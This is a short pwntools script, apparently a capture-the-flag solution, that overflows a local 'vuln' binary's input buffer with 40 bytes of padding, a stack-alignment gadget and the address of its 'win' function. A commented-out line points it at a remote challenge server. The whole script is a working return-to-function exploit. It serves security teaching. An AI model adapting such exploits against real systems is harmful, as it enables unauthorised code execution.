from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)

payload = b"A"*40
payload += pack(0x40101a) # Stack alignment for x86_64
payload += pack(exe.sym.win)

io = process(exe.path) # Exploit local program
#io = remote("uithack.td.org.uit.no", 9002) # Exploit remote program
io.sendlineafter(b"name?", payload)
io.interactive()
